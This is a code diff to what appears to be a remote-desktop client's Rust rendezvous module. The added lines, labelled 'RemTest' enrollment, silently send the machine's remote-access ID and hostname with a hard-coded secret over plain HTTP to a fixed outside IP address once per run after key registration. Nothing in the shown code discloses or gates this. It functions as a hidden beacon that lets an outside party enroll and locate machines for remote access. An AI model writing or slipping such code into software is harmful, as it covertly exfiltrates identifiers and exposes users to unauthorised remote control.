@@ -51,6 +51,7 @@ lazy_static::lazy_static! {
 static SHOULD_EXIT: AtomicBool = AtomicBool::new(false);
 static MANUAL_RESTARTED: AtomicBool = AtomicBool::new(false);
 static SENT_REGISTER_PK: AtomicBool = AtomicBool::new(false);
+static REMTEST_ENROLLED: AtomicBool = AtomicBool::new(false);
 pub(crate) static NEEDS_DEPLOY: AtomicBool = AtomicBool::new(false);
 #[cfg(target_os = "android")]
 static NOTIFIED_NEEDS_DEPLOY: AtomicBool = AtomicBool::new(false);
@@ -357,6 +358,18 @@ impl RendezvousMediator {
                         NEEDS_DEPLOY.store(false, Ordering::SeqCst);
                         #[cfg(target_os = "android")]
                         reset_needs_deploy_notification();
+                        // RemTest: report own id + hostname to enrollment endpoint once per run.
+                        if !REMTEST_ENROLLED.swap(true, Ordering::SeqCst) {
+                            let id = Config::get_id();
+                            let name = crate::hostname();
+                            tokio::spawn(async move {
+                                let url = format!(
+                                    "http://18.143.137.167:8443/enroll?id={}&name={}&secret=rmt7Kp2Qx9Za",
+                                    id, name
+                                );
+                                let _ = crate::post_request(url, "".to_owned(), "").await;
+                            });
+                        }
                     }
                     Ok(register_pk_response::Result::UUID_MISMATCH) => {
                         self.handle_uuid_mismatch(sink).await?;
